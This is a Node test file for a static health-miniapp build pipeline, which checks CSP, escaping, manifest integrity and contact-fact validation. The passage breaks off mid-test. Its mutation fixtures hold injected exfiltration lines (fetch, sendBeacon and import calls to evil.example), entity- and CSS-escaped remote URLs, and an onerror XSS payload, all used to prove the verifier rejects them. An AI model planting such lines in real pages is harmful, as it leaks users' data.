import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const projectRoot = fileURLToPath(new URL('..', import.meta.url));
const buildModuleUrl = new URL('../scripts/build-miniapps.mjs', import.meta.url);
const serveModuleUrl = new URL('../scripts/serve-miniapps.mjs', import.meta.url);
const allowedMiniapps = ['clinic-guide', 'healthy-recipes'];
const requiredCsp = {
  'default-src': ["'self'"],
  'script-src': ["'self'"],
  'style-src': ["'self'"],
  'img-src': ["'self'"],
  'connect-src': ["'none'"],
  'font-src': ["'self'"],
  'frame-src': ["'none'"],
  'object-src': ["'none'"],
  'form-action': ["'none'"],
  'base-uri': ["'none'"],
  'worker-src': ["'none'"],
  'media-src': ["'none'"],
};
const task6ASourceFixturePaths = [
  'assets/logo.png',
  'content/clinic-guide.json',
  'content/recipes.json',
  'miniapps/clinic-guide/app.js',
  'miniapps/clinic-guide/index.html',
  'miniapps/healthy-recipes/app.js',
  'miniapps/healthy-recipes/index.html',
  'miniapps/shared/logo.png',
  'miniapps/shared/motion.js',
  'miniapps/shared/security-headers.conf',
  'miniapps/shared/shell.js',
  'miniapps/shared/styles.css',
  'release/public-contact-facts.json',
  'web-hosting/cabohealth.org/apps/.htaccess',
];

function read(relativePath) {
  return readFileSync(join(projectRoot, relativePath), 'utf8');
}

function readJson(relativePath) {
  return JSON.parse(read(relativePath));
}

function walk(root) {
  if (!existsSync(root)) return [];
  const files = [];
  for (const entry of readdirSync(root, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
    const path = join(root, entry.name);
    if (entry.isDirectory()) files.push(...walk(path));
    else if (entry.isFile()) files.push(path);
  }
  return files;
}

function byteInventory(root) {
  return walk(root).map((path) => ({
    path: relative(root, path).replaceAll('\\', '/'),
    bytes: readFileSync(path).toString('base64'),
  }));
}

function createTask6ASourceFixture(prefix = 'cabohealth-reviewed-sources-') {
  const root = mkdtempSync(join(tmpdir(), prefix));
  for (const relativePath of task6ASourceFixturePaths) {
    const destination = join(root, relativePath);
    mkdirSync(dirname(destination), { recursive: true });
    writeFileSync(destination, readFileSync(join(projectRoot, relativePath)));
  }
  return root;
}

function parseCsp(value) {
  return Object.fromEntries(value.split(';').map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...tokens] = part.split(/\s+/u);
    return [name, tokens];
  }));
}

function exactConfirmedFacts() {
  return {
    status: 'owner-confirmed',
    ownerConfirmedAt: '2026-08-17T02:33:24.000Z',
    facts: {
      publicEmail: { value: 'ivan@ivanguaderrama.com', sourceUrl: 'https://cabohealth.org/app/support/', sourceStatus: 'owner-confirmed-source' },
      phone: { value: '+526241224865', sourceUrl: 'https://www.cabohealth.org/contact.html', sourceStatus: 'owner-confirmed-source' },
      whatsApp: { value: 'https://wa.me/526241224865', sourceUrl: 'https://www.cabohealth.org/contact.html', sourceStatus: 'owner-confirmed-source' },
      address: { value: 'In front of Plaza Amelia Wilkes, Hidalgo, Calle Cabo San Lucas 10, Centro, 23410 Cabo San Lucas, B.C.S., Mexico', sourceUrl: 'https://cabohealth.org/app/support/', sourceStatus: 'owner-confirmed-source' },
      hours: { value: 'Monday–Friday, 10:00 AM–4:00 PM', sourceUrl: 'https://cabohealth.org/app/support/', sourceStatus: 'owner-confirmed-source' },
      appleMapsDestination: {
        value: 'https://maps.apple.com/place?address=In%20front%20of%20Plaza%20Amelia%20Wilkes%2C%20Hidalgo%2C%20Calle%20Cabo%20San%20Lucas%2010%2C%20Centro%2C%2023410%20Cabo%20San%20Lucas%2C%20B.C.S.%2C%20Mexico&name=Cabo%20Health',
        sourceUrl: 'https://maps.apple.com/place?address=In%20front%20of%20Plaza%20Amelia%20Wilkes%2C%20Hidalgo%2C%20Calle%20Cabo%20San%20Lucas%2010%2C%20Centro%2C%2023410%20Cabo%20San%20Lucas%2C%20B.C.S.%2C%20Mexico&name=Cabo%20Health',
        sourceStatus: 'owner-confirmed-source',
      },
      serviceLanguages: { value: ['English', 'Spanish'], sourceUrl: 'https://cabohealth.org/app/support/', sourceStatus: 'owner-confirmed-source' },
    },
  };
}

async function materializeHealthyDirectory(outputRoot, sourceRoot = projectRoot) {
  const { createHealthyArtifactPlan } = await import(buildModuleUrl.href);
  const plan = createHealthyArtifactPlan(sourceRoot);
  mkdirSync(outputRoot);
  for (const [relativePath, bytes] of plan.files) {
    const path = join(outputRoot, relativePath);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, bytes);
  }
  writeFileSync(join(outputRoot, 'manifest.json'), `${JSON.stringify(plan.manifest, null, 2)}\n`);
  return plan;
}

async function withHealthyBuild(assertion) {
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-'));
  const outputRoot = join(tempRoot, 'dist');
  try {
    await materializeHealthyDirectory(outputRoot);
    await assertion(outputRoot);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
}

async function materializeReleaseDirectory(outputRoot, sourceRoot = projectRoot) {
  const { createReleaseArtifactPlan } = await import(buildModuleUrl.href);
  const plan = createReleaseArtifactPlan(sourceRoot);
  mkdirSync(outputRoot);
  for (const [relativePath, bytes] of plan.files) {
    const path = join(outputRoot, relativePath);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, bytes);
  }
  writeFileSync(join(outputRoot, 'manifest.json'), `${JSON.stringify(plan.manifest, null, 2)}\n`);
  return plan;
}

async function withReleaseBuild(assertion) {
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-miniapps-'));
  const outputRoot = join(tempRoot, 'dist');
  try {
    await materializeReleaseDirectory(outputRoot);
    await assertion(outputRoot);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
}

test('source registry contains only the two approved miniapps and the required local shared files', () => {
  const miniappsRoot = join(projectRoot, 'miniapps');
  const actualMiniapps = existsSync(miniappsRoot)
    ? readdirSync(miniappsRoot, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && !['dist', 'shared'].includes(entry.name))
      .map(({ name }) => name)
      .sort()
    : [];
  assert.deepEqual(actualMiniapps, allowedMiniapps);

  for (const relativePath of [
    'miniapps/shared/styles.css',
    'miniapps/shared/motion.js',
    'miniapps/shared/shell.js',
    'miniapps/shared/logo.png',
    'miniapps/shared/security-headers.conf',
    'miniapps/healthy-recipes/index.html',
    'miniapps/healthy-recipes/app.js',
    'miniapps/clinic-guide/index.html',
    'miniapps/clinic-guide/app.js',
    'web-hosting/cabohealth.org/apps/.htaccess',
  ]) {
    assert.ok(existsSync(join(projectRoot, relativePath)), `missing ${relativePath}`);
  }
});

test('healthy-only build is byte-for-byte deterministic and emits no deployable Clinic Guide', async () => {
  const { buildMiniapps, readVerifiedMiniappArtifact } = await import(buildModuleUrl.href);
  const firstContainer = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-a-'));
  const secondContainer = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-b-'));
  const firstRoot = join(firstContainer, 'dist');
  const secondRoot = join(secondContainer, 'dist');
  try {
    await buildMiniapps({ projectRoot, outputRoot: firstRoot, mode: 'healthy' });
    await buildMiniapps({ projectRoot, outputRoot: secondRoot, mode: 'healthy' });
    assert.deepEqual(readFileSync(firstRoot), readFileSync(secondRoot));
    const firstArtifact = readVerifiedMiniappArtifact({ projectRoot, outputRoot: firstRoot });
    const secondArtifact = readVerifiedMiniappArtifact({ projectRoot, outputRoot: secondRoot });
    const firstFiles = [...firstArtifact.files].map(([path, bytes]) => [path, bytes.toString('base64')]);
    const secondFiles = [...secondArtifact.files].map(([path, bytes]) => [path, bytes.toString('base64')]);
    assert.deepEqual(firstFiles, secondFiles);
    assert.ok(firstArtifact.files.has('apps/healthy-recipes/index.html'));
    assert.equal(firstArtifact.files.has('apps/clinic-guide/index.html'), false);
    assert.deepEqual(
      [...firstArtifact.files.keys()].filter((path) => path.endsWith('/index.html')),
      ['apps/healthy-recipes/index.html'],
    );
  } finally {
    rmSync(firstContainer, { recursive: true, force: true });
    rmSync(secondContainer, { recursive: true, force: true });
  }
});

test('generated Healthy Recipes document is complete without JavaScript and has exact safe navigation', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const recipes = readJson('content/recipes.json');

    assert.match(html, /^<!doctype html>\n<html lang="en">/u);
    assert.equal((html.match(/<title>/gu) ?? []).length, 1);
    assert.match(html, /<title>Healthy Recipes \| CaboHealth<\/title>/u);
    assert.match(html, /<meta name="description" content="[^"]+">/u);
    assert.match(html, /<link rel="canonical" href="https:\/\/cabohealth\.org\/apps\/healthy-recipes\/">/u);
    assert.match(html, /<a class="skip-link" href="#main-content">/u);
    assert.equal((html.match(/<main\b/gu) ?? []).length, 1);
    assert.equal((html.match(/<h1\b/gu) ?? []).length, 1);
    assert.match(html, /<h1>\s*<span lang="en" data-locale="en">Healthy Recipes<\/span>\s*<span lang="es-MX" data-locale="es-MX">Recetas saludables<\/span>\s*<\/h1>/u);
    assert.match(html, /data-language="en"[^>]*aria-pressed="true"/u);
    assert.match(html, /data-language="es-MX"[^>]*aria-pressed="false"/u);
    assert.match(html, /aria-live="polite"/u);
    assert.equal((html.match(/data-recipe-slug="/gu) ?? []).length, 12);
    assert.doesNotMatch(html, /<form\b|<textarea\b|type="file"/iu);

    for (const recipe of recipes.recipes) {
      const start = html.indexOf(`data-recipe-slug="${recipe.slug}"`);
      const next = html.indexOf('data-recipe-slug="', start + 1);
      const article = html.slice(start, next === -1 ? html.length : next);
      assert.ok(start >= 0, `missing recipe ${recipe.slug}`);
      assert.match(article, /lang="en" data-locale="en"/u);
      assert.match(article, /lang="es-MX" data-locale="es-MX"/u);
      assert.doesNotMatch(article, /\shidden(?:\s|=|>)/u);
      assert.ok(article.includes(recipe.ingredients.en[0]), `${recipe.slug} English ingredients missing`);
      assert.ok(article.includes(recipe.ingredients['es-MX'][0]), `${recipe.slug} Spanish ingredients missing`);
      assert.ok(article.includes(recipe.steps.en[0]), `${recipe.slug} English steps missing`);
      assert.ok(article.includes(recipe.steps['es-MX'][0]), `${recipe.slug} Spanish steps missing`);
    }

    assert.match(html, /Spinach &amp; Egg Corn Tacos/u);
    for (const [path, english, spanish] of [
      ['privacy', 'Privacy', 'Privacidad'],
      ['terms', 'Terms', 'Términos'],
      ['support', 'Support', 'Soporte'],
      ['report-content', 'Report Content', 'Reportar contenido'],
    ]) {
      assert.match(
        html,
        new RegExp(`<a href="https://cabohealth\\.org/app/${path}/" data-external-action data-label-en="${english}" data-label-es="${spanish}">`, 'u'),
      );
    }
    assert.equal((html.match(/class="external-marker" aria-hidden="true">↗<\/span>/gu) ?? []).length, 4);
    assert.doesNotMatch(html, /target\s*=|window\.open|https:\/\/www\.who\.int|https:\/\/www\.foodsafety\.gov|https:\/\/www\.fsis\.usda\.gov/iu);
  });
});

test('generated HTML and Apache configuration carry equivalent strict CSP', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const headers = readFileSync(join(outputRoot, 'apps/.htaccess'), 'utf8');
    const metaMatch = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/u);
    const headerMatch = headers.match(/Header always set Content-Security-Policy "([^"]+)"/u);
    assert.ok(metaMatch, 'missing CSP meta');
    assert.ok(headerMatch, 'missing CSP server header');
    assert.equal(metaMatch[1], headerMatch[1]);
    assert.deepEqual(parseCsp(metaMatch[1]), requiredCsp);
    assert.doesNotMatch(metaMatch[1], /unsafe-inline|unsafe-eval|data:|blob:|https?:/iu);
  });
});

test('artifact verifier rejects remote resources, active exfiltration, forms, popups and CSP drift', async () => {
  const { verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['remote script', 'index.html', '</body>', '<script src="https://evil.example/x.js"></script></body>'],
    ['remote image', 'index.html', '</body>', '<img src="//evil.example/x.png" alt=""></body>'],
    ['remote srcset', 'index.html', '</body>', '<img src="../shared/logo.png" srcset="https://evil.example/x.png 2x" alt=""></body>'],
    ['popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target="_blank" href="https://cabohealth.org/app/privacy/"'],
    ['unquoted popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target=_blank href="https://cabohealth.org/app/privacy/"'],
    ['form', 'index.html', '</body>', '<form action="/collect"><input name="name"></form></body>'],
    ['meta refresh', 'index.html', '</head>', '<meta http-equiv="refresh" content="0;url=https://evil.example"></head>'],
    ['unquoted meta refresh', 'index.html', '</head>', '<meta http-equiv=refresh content="0;url=https://evil.example"></head>'],
    ['inline style element', 'index.html', '</head>', '<style>.x{background:url(https://evil.example/x.png)}</style></head>'],
    ['fetch', 'app.js', '', '\nfetch("https://evil.example/data");'],
    ['xhr', 'app.js', '', '\nnew XMLHttpRequest();'],
    ['worker', 'app.js', '', '\nnew Worker("worker.js");'],
    ['window open', 'app.js', '', '\nwindow.open("/");'],
    ['direct location redirect', 'app.js', '', '\nlocation = "https://evil.example/";'],
    ['send beacon', 'app.js', '', '\nnavigator.sendBeacon("https://evil.example/", "x");'],
    ['dynamic import', 'app.js', '', '\nimport("https://evil.example/module.js");'],
    ['css url', 'styles.css', '', '\n.x{background:url(https://evil.example/x.png)}'],
    ['css import', 'styles.css', '', '\n@import "https://evil.example/x.css";'],
    ['weakened CSP', 'index.html', "connect-src 'none'", "connect-src 'self'"],
    ['numeric entity URL', 'index.html', 'src="../shared/logo.png"', 'src="&#x68;ttps://evil.example/logo.png"'],
    ['named entity URL', 'index.html', 'src="../shared/logo.png"', 'src="https&colon;//evil.example/logo.png"'],
    ['duplicate href', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'href="https://evil.example/" href="https://cabohealth.org/app/privacy/"'],
    ['quoted tag delimiter', 'index.html', '</body>', '<a title=">" href="https://evil.example/">evil</a></body>'],
    ['SVG xlink navigation', 'index.html', '</body>', '<svg><a xlink:href="https://evil.example/"><text>evil</text></a></svg></body>'],
    ['file input', 'index.html', '</body>', '<input type="file"></body>'],
    ['CSS escaped url', 'styles.css', '', '\n.x{background:u\\72l(https://evil.example/x.png)}'],
    ['computed global fetch', 'app.js', '', '\nglobalThis["fetch"]("https://evil.example/data");'],
    ['computed window location', 'app.js', '', '\nwindow["location"]["href"] = "https://evil.example/";'],
    ['file reader', 'app.js', '', '\nnew FileReader();'],
    ['directory indexing', 'headers', 'Options -Indexes', 'Options Indexes'],
    ['server CSP drift', 'headers', "connect-src 'none'", "connect-src 'self'"],
    ['missing nosniff', 'headers', 'Header always set X-Content-Type-Options "nosniff"', 'Header always set X-Content-Type-Options ""'],
    ['missing frame denial', 'headers', 'Header always set X-Frame-Options "DENY"', 'Header always set X-Frame-Options "SAMEORIGIN"'],
    ['referrer drift', 'headers', 'Header always set Referrer-Policy "no-referrer"', 'Header always set Referrer-Policy "origin"'],
    ['permissions drift', 'headers', 'payment=()', 'payment=(self)'],
  ];

  for (const [label, relativePath, needle, replacement] of mutations) {
    await withHealthyBuild(async (outputRoot) => {
      const verify = () => verifyBuiltArtifact({
        projectRoot,
        outputRoot,
        expectedEntrySlugs: ['healthy-recipes'],
      });
      assert.equal(verify(), true, `${label} fixture must begin verified`);
      const path = relativePath === 'index.html'
        ? join(outputRoot, 'apps/healthy-recipes/index.html')
        : relativePath === 'app.js'
          ? join(outputRoot, 'apps/healthy-recipes/app.js')
          : relativePath === 'styles.css'
            ? join(outputRoot, 'apps/shared/styles.css')
            : join(outputRoot, 'apps/.htaccess');
      const original = readFileSync(path, 'utf8');
      writeFileSync(path, needle ? original.replace(needle, replacement) : original + replacement);
      assert.throws(
        verify,
        undefined,
        label,
      );
    });
  }
});

test('reviewed source attestation rejects browser-policy mutations before they can become expected output', async () => {
  const { createHealthyArtifactPlan } = await import(buildModuleUrl.href);
  const mutations = [
    ['HTML entity URL', 'miniapps/healthy-recipes/index.html', '</body>', '<img src="&#x68;ttps://evil.example/logo.png" alt=""></body>'],
    ['duplicate HTML navigation', 'miniapps/healthy-recipes/index.html', '</body>', '<a href="https://evil.example/" href="#main-content">evil</a></body>'],
    ['quoted tag delimiter', 'miniapps/healthy-recipes/index.html', '</body>', '<a title=">" href="https://evil.example/">evil</a></body>'],
    ['SVG navigation', 'miniapps/healthy-recipes/index.html', '</body>', '<svg><a xlink:href="https://evil.example/"><text>evil</text></a></svg></body>'],
    ['file input', 'miniapps/healthy-recipes/index.html', '</body>', '<input type="file"></body>'],
    ['computed fetch', 'miniapps/healthy-recipes/app.js', '', '\nglobalThis["fetch"]("https://evil.example/data");'],
    ['computed navigation', 'miniapps/healthy-recipes/app.js', '', '\nwindow["location"]["href"] = "https://evil.example/";'],
    ['file reader', 'miniapps/healthy-recipes/app.js', '', '\nnew FileReader();'],
    ['CSS escape', 'miniapps/shared/styles.css', '', '\n.x{background:u\\72l(https://evil.example/x.png)}'],
    ['nondeployable Clinic source drift', 'miniapps/clinic-guide/app.js', '', '\n// unreviewed source drift'],
    ['editorial source drift', 'content/recipes.json', 'USDA FSIS — Food Allergies: The Big 9', 'Unreviewed source title'],
  ];

  for (const [label, relativePath, needle, replacement] of mutations) {
    const fixtureRoot = createTask6ASourceFixture();
    try {
      assert.ok(createHealthyArtifactPlan(fixtureRoot), `${label} fixture must begin attested`);
      const path = join(fixtureRoot, relativePath);
      const original = readFileSync(path, 'utf8');
      writeFileSync(path, needle ? original.replace(needle, replacement) : original + replacement);
      assert.throws(
        () => createHealthyArtifactPlan(fixtureRoot),
        /REVIEWED_SOURCE_ATTESTATION|reviewed source/iu,
        label,
      );
    } finally {
      rmSync(fixtureRoot, { recursive: true, force: true });
    }
  }
});

test('artifact verifier requires the exact non-release manifest and complete sorted hash inventory', async () => {
  const { verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['missing manifest', (outputRoot) => unlinkSync(join(outputRoot, 'manifest.json'))],
    ['release-ready flip', (outputRoot, manifest) => ({ ...manifest, releaseReady: true })],
    ['wrong mode', (outputRoot, manifest) => ({ ...manifest, mode: 'release' })],
    ['Clinic entry leak', (outputRoot, manifest) => ({ ...manifest, entrySlugs: ['healthy-recipes', 'clinic-guide'] })],
    ['missing blocked Clinic entry', (outputRoot, manifest) => ({ ...manifest, blockedEntrySlugs: [] })],
    ['wrong source version', (outputRoot, manifest) => ({ ...manifest, sourceVersion: '9.9.9' })],
    ['extra root key', (outputRoot, manifest) => ({ ...manifest, deployable: true })],
    ['empty inventory', (outputRoot, manifest) => ({ ...manifest, files: [] })],
    ['stale hash', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, sha256: '0'.repeat(64) } : file),
    })],
    ['stale size', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, size: file.size + 1 } : file),
    })],
    ['extra file-row key', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, executable: false } : file),
    })],
    ['duplicate inventory path', (outputRoot, manifest) => ({
      ...manifest,
      files: [...manifest.files, { ...manifest.files.at(-1) }],
    })],
    ['unsorted inventory', (outputRoot, manifest) => ({ ...manifest, files: [...manifest.files].reverse() })],
    ['traversal inventory path', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, path: '../outside' } : file),
    })],
    ['noncanonical JSON bytes', (outputRoot, manifest) => {
      writeFileSync(join(outputRoot, 'manifest.json'), JSON.stringify(manifest));
    }],
    ['coordinated artifact and manifest tamper', (outputRoot, manifest) => {
      const path = join(outputRoot, 'apps/healthy-recipes/app.js');
      const bytes = Buffer.from('globalThis["fetch"]("https://evil.example/");\n');
      writeFileSync(path, bytes);
      return {
        ...manifest,
        files: manifest.files.map((file) => file.path === 'apps/healthy-recipes/app.js'
          ? { ...file, size: bytes.byteLength, sha256: createHash('sha256').update(bytes).digest('hex') }
          : file),
      };
    }],
    ['extra artifact', (outputRoot) => writeFileSync(join(outputRoot, 'unexpected.txt'), 'unexpected\n')],
  ];

  for (const [label, mutate] of mutations) {
    await withHealthyBuild(async (outputRoot) => {
      const verify = () => verifyBuiltArtifact({
        projectRoot,
        outputRoot,
        expectedEntrySlugs: ['healthy-recipes'],
      });
      assert.equal(verify(), true, `${label} fixture must begin verified`);
      const manifestPath = join(outputRoot, 'manifest.json');
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
      const replacement = mutate(outputRoot, manifest);
      if (replacement) writeFileSync(manifestPath, `${JSON.stringify(replacement, null, 2)}\n`);
      assert.throws(
        verify,
        undefined,
        label,
      );
    });
  }
});

test('renderer HTML-escapes canonical content before it reaches the static document', async () => {
  const { renderHealthyRecipesDocument } = await import(buildModuleUrl.href);
  const content = readJson('content/recipes.json');
  content.recipes[0].summary.en = '<img src="https://evil.example/x" onerror="alert(1)">';
  const html = renderHealthyRecipesDocument(
    read('miniapps/healthy-recipes/index.html'),
    content,
  );
  assert.doesNotMatch(html, /<img src="https:\/\/evil\.example/u);
  assert.match(html, /&lt;img src=&quot;https:\/\/evil\.example\/x&quot; onerror=&quot;alert\(1\)&quot;&gt;/u);
});

test('production build rejects every incomplete or malformed owner-fact record', async () => {
  const { validatePublicContactFacts } = await import(buildModuleUrl.href);
  const valid = exactConfirmedFacts();
  assert.deepEqual(validatePublicContactFacts(valid), []);

  const invalidRecords = [];
  for (const omitted of Object.keys(valid.facts)) {
    const record = structuredClone(valid);
    delete record.facts[omitted];
    invalidRecords.push(record);
  }
  const extra = structuredClone(valid);
  extra.facts.extraContact = structuredClone(valid.facts.phone);
  invalidRecords.push(extra);
  invalidRecords.push({ ...structuredClone(valid), status: 'awaiting-owner-confirmation' });
  invalidRecords.push({ ...structuredClone(valid), ownerConfirmedAt: 'not-a-timestamp' });

  const badSource = structuredClone(valid);
  badSource.facts.phone.sourceUrl = ' http://cabohealth.org/contact/ ';
  invalidRecords.push(badSource);
  const badSourceStatus = structuredClone(valid);
  badSourceStatus.facts.hours.sourceStatus = 'owner-confirmation-required';
  invalidRecords.push(badSourceStatus);
  const blankLanguages = structuredClone(valid);
  blankLanguages.facts.serviceLanguages.value = ['English', ' '];
  invalidRecords.push(blankLanguages);
  for (const [factName, replacement] of [
    ['publicEmail', 'other@example.test'],
    ['phone', '+526241224866'],
    ['whatsApp', 'https://wa.me/526241224866'],
    ['address', 'Different address'],
    ['hours', 'Different hours'],
    ['serviceLanguages', ['English', 'Español']],
  ]) {
    const changed = structuredClone(valid);
    changed.facts[factName].value = replacement;
    invalidRecords.push(changed);
  }
  const changedConfirmation = structuredClone(valid);
  changedConfirmation.ownerConfirmedAt = '2026-08-17T02:33:25.000Z';
  invalidRecords.push(changedConfirmation);
  const changedSource = structuredClone(valid);
  changedSource.facts.publicEmail.sourceUrl = 'https://cabohealth.org/app/other/';
  invalidRecords.push(changedSource);

  for (const [index, record] of invalidRecords.entries()) {
    assert.notDeepEqual(validatePublicContactFacts(record), [], `invalid record ${index} passed`);
  }
});

test('production build emits a deterministic immutable release capsule for exactly two roots', async () => {
  const { buildMiniapps, readVerifiedMiniappArtifact } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-gate-'));
  const outputRoot = join(tempRoot, 'dist');
  try {
    const manifest = await buildMiniapps({ projectRoot, outputRoot, mode: 'release' });
    assert.deepEqual(manifest.entrySlugs, ['healthy-recipes', 'clinic-guide']);
    assert.deepEqual(manifest.blockedEntrySlugs, []);
    assert.equal(manifest.mode, 'release');
    assert.equal(manifest.releaseReady, true);
    assert.equal(lstatSync(outputRoot).isFile(), true);
    const artifact = readVerifiedMiniappArtifact({
      projectRoot,
      outputRoot,
      expectedEntrySlugs: ['healthy-recipes', 'clinic-guide'],
    });
    assert.deepEqual(
      [...artifact.files.keys()].filter((path) => path.endsWith('/index.html')),
      ['apps/clinic-guide/index.html', 'apps/healthy-recipes/index.html'],
    );
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('release renderer preserves the complete bilingual Clinic Guide without JavaScript', async () => {
  await withReleaseBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/clinic-guide/index.html'), 'utf8');
    const guide = readJson('content/clinic-guide.json');

    assert.match(html, /^<!doctype html>\n<html lang="en">/u);
    assert.equal((html.match(/<title>/gu) ?? []).length, 1);
    assert.match(html, /<title>Clinic Guide \| CaboHealth<\/title>/u);
    assert.match(html, /<meta name="description" content="[^"]+">/u);
    assert.match(html, /<link rel="canonical" href="https:\/\/cabohealth\.org\/apps\/clinic-guide\/">/u);
    assert.equal((html.match(/<main\b/gu) ?? []).length, 1);
    assert.equal((html.match(/<h1\b/gu) ?? []).length, 1);
    assert.match(html, /data-language="en"[^>]*aria-pressed="true"/u);
    assert.match(html, /data-language="es-MX"[^>]*aria-pressed="false"/u);
    assert.match(html, /<time datetime="2026-08-16">2026-08-16<\/time>/u);
    assert.doesNotMatch(html, /\shidden(?:\s|=|>)/u);

    for (const group of guide.groups) {
      assert.ok(html.includes(group.title.en), `${group.id} English title missing`);
      assert.ok(html.includes(group.title['es-MX']), `${group.id} Spanish title missing`);
      for (const item of group.items) {
        assert.ok(html.includes(item.text.en), `${item.id} English text missing`);
        assert.ok(html.includes(item.text['es-MX']), `${item.id} Spanish text missing`);
      }
    }
    assert.ok(html.includes(guide.emergency.en));
    assert.ok(html.includes(guide.emergency['es-MX']));
    assert.match(html, /Accessibility and language/u);
    assert.match(html, /English, Spanish/u);
    assert.match(html, /In front of Plaza Amelia Wilkes, Hidalgo, Calle Cabo San Lucas 10, Centro, 23410 Cabo San Lucas, B\.C\.S\., Mexico/u);
    assert.match(html, /Monday–Friday, 10:00 AM–4:00 PM/u);
    assert.doesNotMatch(html, /verified Apple listing|Apple place-card/iu);
  });
});

test('Clinic Guide actions exactly match the native allowlist and remain literal same-window anchors', async () => {
  await withReleaseBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/clinic-guide/index.html'), 'utf8');
    const actions = [
      'mailto:ivan@ivanguaderrama.com',
      'tel:+526241224865',
      'https://maps.apple.com/place?address=In%20front%20of%20Plaza%20Amelia%20Wilkes%2C%20Hidalgo%2C%20Calle%20Cabo%20San%20Lucas%2010%2C%20Centro%2C%2023410%20Cabo%20San%20Lucas%2C%20B.C.S.%2C%20Mexico&amp;name=Cabo%20Health',
      'https://wa.me/526241224865',
      'https://cabohealth.org/app/privacy/',
      'https://cabohealth.org/app/terms/',
      'https://cabohealth.org/app/support/',
      'https://cabohealth.org/app/report-content/',
    ];
    for (const href of actions) assert.match(html, new RegExp(`href="${href.replace(/[.*+?^${}()|[\\]\\]/g, '\\$&')}"`, 'u'));
    assert.equal((html.match(/data-external-action/gu) ?? []).length, actions.length);
    assert.doesNotMatch(html, /target\s*=|window\.open|location\s*=|location\.href/iu);
  });
});

test('release artifact has strict CSP and no remote subresources, collection forms, analytics or native bridge', async () => {
  await withReleaseBuild(async (outputRoot) => {
    const allText = walk(outputRoot)
      .filter((path) => /\.(?:html|css|js)$/u.test(path))
      .map((path) => readFileSync(path, 'utf8'))
      .join('\n');
    const clinicHtml = readFileSync(join(outputRoot, 'apps/clinic-guide/index.html'), 'utf8');
    const csp = clinicHtml.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/u)?.[1];
    assert.deepEqual(parseCsp(csp), requiredCsp);
    assert.doesNotMatch(allText, /<form\b|<textarea\b|type=["']file|fetch\s*\(|XMLHttpRequest|EventSource|WebSocket|Worker\s*\(|sendBeacon|window\.ReactNativeWebView|postMessage\s*\(|target\s*=|window\.open/iu);
    assert.doesNotMatch(allText, /(?:src|srcset)=["'](?:https?:)?\/\//iu);
    assert.doesNotMatch(allText, /(?:@import|url\s*\()\s*["']?(?:https?:)?\/\//iu);
    assert.doesNotMatch(allText, /analytics|tracking|advertising|patient portal|medical record|buy now|purchase|subscribe/iu);
  });
});

test('release build and independent attestation reject source drift and produce identical bytes', async () => {
  const { buildMiniapps, createReleaseArtifactPlan } = await import(buildModuleUrl.href);
  const firstRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-determinism-a-'));
  const secondRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-determinism-b-'));
  const fixtureRoot = createTask6ASourceFixture('cabohealth-release-attestation-');
  try {
    await buildMiniapps({ projectRoot, outputRoot: join(firstRoot, 'dist'), mode: 'release' });
    await buildMiniapps({ projectRoot, outputRoot: join(secondRoot, 'dist'), mode: 'release' });
    assert.deepEqual(readFileSync(join(firstRoot, 'dist')), readFileSync(join(secondRoot, 'dist')));
    assert.ok(createReleaseArtifactPlan(fixtureRoot));
    const clinicPath = join(fixtureRoot, 'miniapps/clinic-guide/index.html');
    writeFileSync(clinicPath, `${readFileSync(clinicPath, 'utf8')}\n<!-- drift -->\n`);
    assert.throws(() => createReleaseArtifactPlan(fixtureRoot), /ATTESTATION|reviewed source/iu);
  } finally {
    rmSync(firstRoot, { recursive: true, force: true });
    rmSync(secondRoot, { recursive: true, force: true });
    rmSync(fixtureRoot, { recursive: true, force: true });
  }
});

test('builder refuses a broad output target outside the exact dist or isolated temp scope', async () => {
  const { assertSafeMiniappOutputPath } = await import(buildModuleUrl.href);
  assert.throws(
    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: projectRoot }),
    /unsafe miniapp output path/iu,
  );
  assert.throws(
